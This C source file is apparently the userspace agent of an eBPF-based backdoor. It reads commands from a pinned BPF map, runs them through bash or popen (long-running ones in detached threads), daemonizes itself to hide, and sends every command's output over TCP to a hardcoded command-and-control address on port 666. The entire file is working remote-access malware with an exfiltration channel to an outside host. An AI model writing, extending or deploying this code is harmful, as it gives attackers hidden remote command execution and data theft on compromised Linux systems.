// Userspace agent - polls eBPF map and executes commands
// This version uses a threaded model for long-running tasks.
// Compile: gcc c2_agent_userspace.c -lbpf -lpthread -o c2_agent

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h> // 引入线程库
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define CMD_SIZE 100
#define C2_SERVER_IP "38.207.189.106"
#define C2_SERVER_PORT 666
#define POLL_INTERVAL 2
#define COMMAND_TIMEOUT_SECONDS 10

// 标记长时运行命令的字符，依然是最简洁的信号
#define LONG_RUNNING_MARKER '&'

struct blackdoor_command {
    char cmd[CMD_SIZE];
    __u32 processed;
};

// 用于向新线程传递参数的结构体
typedef struct {
    char command[CMD_SIZE];
} thread_args_t;

// Exfiltrate output back to C2 server (保持不变)
void send_output_to_c2(const char* output) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_SERVER_PORT);
    inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);

    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return;
    }

    int output_len = strlen(output);
    send(sock, &output_len, sizeof(output_len), 0);
    send(sock, output, output_len, 0);
    close(sock);
}

// 这是在新线程中运行的函数，用于处理长时命令
void* long_running_command_handler(void* args) {
    thread_args_t* thread_args = (thread_args_t*)args;
    char cmd_to_run[CMD_SIZE];
    strncpy(cmd_to_run, thread_args->command, sizeof(cmd_to_run));
    free(thread_args); // 复制完命令后立即释放参数内存

    FILE* pipe = popen(cmd_to_run, "r");
    if (!pipe) {
        send_output_to_c2("[!] Thread popen() failed");
        return NULL;
    }

    // 为每个输出块分配内存并发送，避免无限增长的缓冲区
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        send_output_to_c2(buffer);
    }
    
    pclose(pipe);
    send_output_to_c2("[*] Persistent command thread finished.");

    return NULL;
}

// 执行短时命令的函数
void execute_short_command(const char* cmd) {
    char timed_cmd[CMD_SIZE + 64];
    snprintf(timed_cmd, sizeof(timed_cmd), "timeout %ds bash -c \"%s\"", COMMAND_TIMEOUT_SECONDS, cmd);

    FILE* pipe = popen(timed_cmd, "r");
    if (!pipe) {
        send_output_to_c2("[!] Short command popen() failed");
        return;
    }
    
    char* output = malloc(8192); // 为短命令结果分配一个较大的缓冲区
    if (!output) {
        pclose(pipe);
        return;
    }
    memset(output, 0, 8192);
    size_t total = 0;

    while (fgets(output + total, 8192 - total, pipe) != NULL) {
        total = strlen(output);
        if (total >= 8000) break;
    }

    pclose(pipe);
    send_output_to_c2(output);
    free(output);
}

int main(int argc, char** argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <path_to_bpf_map>\n", argv[0]);
        return 1;
    }

    int map_fd = bpf_obj_get(argv[1]);
    if (map_fd < 0) {
        fprintf(stderr, "[!] Failed to get map FD: %s\n", strerror(errno));
        return 1;
    }

    // Daemonize
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);

    __u32 key = 0;
    struct blackdoor_command cmd_data;

    while (1) {
        if (bpf_map_lookup_elem(map_fd, &key, &cmd_data) == 0) {
            if (cmd_data.processed == 0 && strlen(cmd_data.cmd) > 0) {
                // 命令分发逻辑
                if (cmd_data.cmd[0] == LONG_RUNNING_MARKER) {
                    // 长时命令：创建线程
                    pthread_t tid;
                    thread_args_t* args = malloc(sizeof(thread_args_t));
                    strncpy(args->command, cmd_data.cmd + 1, sizeof(args->command)); // 跳过 '&'

                    if (pthread_create(&tid, NULL, long_running_command_handler, args) == 0) {
                        pthread_detach(tid); // 让线程在结束后自行清理，主循环不关心它的死活
                    } else {
                        free(args); // 线程创建失败，释放内存
                    }
                } else {
                    // 短时命令：直接执行
                    execute_short_command(cmd_data.cmd);
                }

                // **关键：** 无论命令如何执行，都立即标记为已处理
                // 这使得主循环可以立刻去轮询下一个命令
                cmd_data.processed = 1;
                memset(cmd_data.cmd, 0, sizeof(cmd_data.cmd)); // 清空命令槽
                bpf_map_update_elem(map_fd, &key, &cmd_data, BPF_ANY);
            }
        }
        sleep(POLL_INTERVAL);
    }

    close(map_fd);
    return 0;
}